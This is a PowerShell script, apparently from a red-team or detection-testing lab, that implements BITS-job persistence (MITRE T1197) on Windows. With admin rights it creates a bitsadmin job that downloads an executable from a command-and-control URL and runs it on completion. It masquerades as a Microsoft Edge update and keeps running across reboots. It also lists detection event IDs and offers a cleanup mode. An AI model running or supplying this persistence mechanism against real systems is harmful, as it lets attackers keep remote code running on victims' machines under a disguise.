# persist_09_bits.ps1 -- BITS Job Persistence
# MITRE ATT&CK: T1197
# Requires: Admin
# Detection: Sysmon EventID 1 (bitsadmin.exe), BitsClient EventID 3/4

param(
    [string]$C2Url = "http://192.168.247.139:8080/update.exe",
    [string]$DownloadPath = "$env:LOCALAPPDATA\Microsoft\EdgeUpdate\msedgeupdate.exe",
    [string]$JobName = "MicrosoftEdgeUpdateDownload",
    [int]$DelaySeconds = 86400,
    [switch]$Cleanup
)

$ErrorActionPreference = "Stop"

if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Write-Host "[-] This script requires Administrator privileges!" -ForegroundColor Red
    exit 1
}

function Install-BitsJob {
    Write-Host "[*] BITS Job Persistence" -ForegroundColor Cyan
    Write-Host "    MITRE: T1197"
    Write-Host "    C2 URL: $C2Url"
    Write-Host "    Download to: $DownloadPath"
    Write-Host "    Delay: $DelaySeconds seconds ($([math]::Round($DelaySeconds/3600, 1)) hours)"

    $dir = Split-Path $DownloadPath -Parent
    if ($dir -and -not (Test-Path $dir)) {
        New-Item -ItemType Directory -Path $dir -Force | Out-Null
    }

    # Cancel existing job if present (idempotent)
    & bitsadmin /cancel $JobName 2>$null | Out-Null

    Write-Host ""
    Write-Host "    [Method 1: bitsadmin]" -ForegroundColor Yellow

    & bitsadmin /create /download $JobName 2>$null | Out-Null
    & bitsadmin /addfile $JobName $C2Url $DownloadPath 2>$null | Out-Null
    & bitsadmin /setnotifycmdline $JobName $DownloadPath "" 2>$null | Out-Null
    & bitsadmin /setminretrydelay $JobName $DelaySeconds 2>$null | Out-Null
    & bitsadmin /setpriority $JobName LOW 2>$null | Out-Null
    & bitsadmin /resume $JobName 2>$null | Out-Null

    Write-Host "    [+] BITS job created: $JobName"

    & bitsadmin /info $JobName /verbose 2>$null | Select-String "STATE|NOTIFICATION|FILES" | ForEach-Object {
        Write-Host "    $_"
    }

    Write-Host ""
    Write-Host "    [!] How it works:" -ForegroundColor Yellow
    Write-Host "        BITS service (svchost.exe) downloads file from C2"
    Write-Host "        After download completes -> executes the downloaded file"
    Write-Host "        Survives reboot -- BITS jobs persist across restarts"

    Write-Host ""
    Write-Host "    [DETECTION] Sysmon EventID 1: bitsadmin.exe with /create or /addfile" -ForegroundColor Red
    Write-Host "    [DETECTION] BitsClient EventID 3: BITS job created" -ForegroundColor Red
    Write-Host "    [DETECTION] BitsClient EventID 4: BITS transfer complete" -ForegroundColor Red
}

function Remove-BitsJob {
    Write-Host "[*] Cleaning up BITS Job..." -ForegroundColor Yellow
    & bitsadmin /cancel $JobName 2>$null | Out-Null
    Write-Host "    [+] BITS job cancelled: $JobName"

    Get-BitsTransfer -ErrorAction SilentlyContinue | Where-Object {
        $_.DisplayName -like "*EdgeUpdate*"
    } | Remove-BitsTransfer -ErrorAction SilentlyContinue
    Write-Host "    [+] PowerShell BITS jobs removed"

    if (Test-Path $DownloadPath) {
        Remove-Item $DownloadPath -Force
        Write-Host "    [+] File removed: $DownloadPath"
    }
    Write-Host "    [+] Cleanup complete"
}

# --- Main ---
if ($Cleanup) {
    Remove-BitsJob
} else {
    Install-BitsJob
}
